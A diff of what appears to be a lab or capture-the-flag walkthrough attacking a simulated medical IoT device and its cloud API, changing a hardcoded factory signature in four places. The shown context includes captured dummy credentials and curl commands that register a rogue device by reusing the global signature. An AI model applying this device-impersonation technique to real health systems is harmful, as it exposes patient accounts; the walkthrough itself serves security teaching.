@@ -462,7 +462,7 @@ async def redirect_to_attacker(client):
 ```
 ============================================================
 [CAPTURED REGISTRATION]
-Signature: CareOtterFactorySig2026
+Signature: 9C0C306DEF2A
 MAC:       B8:27:EB:12:34:56
 Patient:   {'username': 'alice_patient', 'password': 'super_secret_patient_123'}
 Admin:     {'username': 'dr_bob_admin', 'password': 'super_secret_admin_456'}
@@ -480,7 +480,7 @@ REAL_CLOUD="http://192.168.2.2:5002"
 curl -s -X POST "$REAL_CLOUD/admin/device/register" \
   -H "Content-Type: application/json" \
   -d '{
-    "signature": "CareOtterFactorySig2026",
+    "signature": "9C0C306DEF2A",
     "mac": "B8:27:EB:12:34:56",
     "patient": {
       "username": "alice_patient",
@@ -499,7 +499,7 @@ curl -s -X POST "$REAL_CLOUD/admin/device/register" \
 {"status": "registered", "device_mac": "B8:27:EB:12:34:56"}
 ```
 
-> **Vuln:** The `CareOtterFactorySig2026` signature is global and identical. It is not bound to the MAC.
+> **Vuln:** The `9C0C306DEF2A` signature is global and identical. It is not bound to the MAC.
 
 ### PHASE 8: Access the Admin Panel
 
@@ -661,7 +661,7 @@ curl -s http://192.168.2.2:5002/hint
 # Cloud API — signature-based registration
 curl -X POST http://192.168.2.2:5002/admin/device/register \
   -H "Content-Type: application/json" \
-  -d '{"signature":"CareOtterFactorySig2026","mac":"B8:27:EB:XX:XX:XX","patient":{"username":"p","password":"p"},"admin":{"username":"a","password":"a"},"device_ip":"192.168.2.1"}'
+  -d '{"signature":"9C0C306DEF2A","mac":"B8:27:EB:XX:XX:XX","patient":{"username":"p","password":"p"},"admin":{"username":"a","password":"a"},"device_ip":"192.168.2.1"}'
 ```
 
 
